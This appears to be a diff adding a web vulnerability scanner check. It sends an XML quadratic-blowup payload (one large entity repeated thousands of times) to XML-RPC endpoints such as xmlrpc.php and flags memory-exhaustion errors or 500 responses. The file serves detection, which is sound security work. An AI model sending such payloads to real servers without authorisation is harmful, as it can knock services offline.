@@ -1,0 +1,150 @@
+#include constants.inc;
+#include helpers.inc;
+#include string_helpers.inc;
+var lastJob         = null;
+var confirmJob      = null;
+var found           = false;
+var alertDetails    = "";
+var debug           = false;
+// **************************************************************************************							 
+function alert(uri, details)
+{	
+	var vxml = 'XML_Quadratic_Blowup_Attack.xml'; 
+	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(lastJob);
+	
+	ri.details = details;
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function prepareBlowupXML(entitySize, entityCount)
+{
+	return '<?xml version="1.0"?>' + CRLF() +
+		' <!DOCTYPE acunetix [  ' + CRLF() +
+		'  <!ENTITY acu "' + "A".repeat(entitySize) + '">]>' + CRLF() +
+		'<blowup>' + CRLF() +
+		"&acu;".repeat(entityCount) + CRLF() +
+		'</blowup>' + CRLF();
+}
+/***********************************************************************************/
+function testQuadraticBlowup(uri)
+{
+	//trace("test it on " + uri);
+	var found = false;
+	alertDetails = "";
+	
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = scanURL;	
+	lastJob.uri  = uri;		
+	
+	lastJob.request.body = prepareBlowupXML(150000, 2000);
+	
+	lastJob.execute();
+    if (!lastJob.wasError) {
+    	
+    	//trace(lastJob.response.msg2);
+    	
+        var match = /(Allowed memory size of \d+ bytes exhausted)/i.exec(lastJob.response.body);
+	    if(match || lastJob.response.msg2 == 500) {
+	    	if (match) {
+	    		alertDetails = "Pattern found: [dark]" + match + "[/dark]";
+	    	} else {
+	    		alertDetails = "Server responded with HTTP status code 500 (Internal Server Error).";
+	    	}
+	    	
+	    	//trace(match);
+	    	//trace(lastJob.response.msg2);
+            found = true;
+        }
+    }
+    var confirm1 = false;
+		
+	// confirm it
+	if (found) {		
+		if (debug) trace("confirm it");
+			
+		confirmJob = new THTTPJob();
+		confirmJob.verb = "POST";
+		confirmJob.url  = scanURL;	
+		confirmJob.uri  = uri;		
+		
+		confirmJob.request.body = prepareBlowupXML(5, 5);
+		
+		confirmJob.execute();
+	    if (!confirmJob.wasError) {
+	        var match = /(Allowed memory size of \d+ bytes exhausted)/i.exec(confirmJob.response.body);
+		    if(!match && confirmJob.response.msg2 == 200) {
+                confirm1 = true;
+	        }
+	    }
+        if (confirm1) {
+            if (debug) trace("second confirmation");
+            confirmJob = new THTTPJob();
+            confirmJob.verb = "POST";
+            confirmJob.url  = scanURL;
+            confirmJob.uri  = uri;
+            confirmJob.request.body = prepareBlowupXML(150000, 2000);
+            confirmJob.request.body = confirmJob.request.body.replaceAll("&acu;", "racun");
+            confirmJob.execute();
+            if (!confirmJob.wasError) {
+                var match = /(Allowed memory size of \d+ bytes exhausted)/i.exec(confirmJob.response.body);
+                if(!match && confirmJob.response.msg2 == 200) {
+                    alert(uri, alertDetails);
+                }
+            }
+        }
+	}    
+	return found;
+}
+/***********************************************************************************/
+function findTargets(list)
+{	
+	for (var i=0;i<list.count; i++){			
+		var sf = list.getFile(i);		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile)
+		{
+            var fname = sf.name.toLowerCase();   
+            //trace(fname);         
+            if (
+				     fname.indexOf("xmlrpc") != -1 
+                )
+			{
+				//trace("found " + sf.fullPath);
+				dirs.push(sf.fullPath);
+                // don't test more than 5
+                if (dirs.length>5) break;
+			}
+        }
+	}
+}
+/***********************************************************************************/
+/* main entry point */
+var dirs = new Array();
+var siteRoot = getPathDirectory(scanURL.path);
+var list = getNewFiles(loadHttp);
+findTargets(list);
+found = dirs.length > 0;
+if (dirs.length) { 
+	for (var i=0; i<dirs.length; i++)
+	{
+		if (testQuadraticBlowup(dirs[i])) break;
+	}
+}
+if (!found) {
+    var testedStatic = getGlobalValue("xmlqudraticblowup");
+    if (!testedStatic)
+    {
+    	SetGlobalValue("xmlqudraticblowup", 1, true);
+        
+		testQuadraticBlowup(siteRoot + "/xmlrpc.php");  
+        testQuadraticBlowup(siteRoot +  "/index.php/api/xmlrpc");
+        testQuadraticBlowup(siteRoot + "/xmlrpc");
+    }
+}
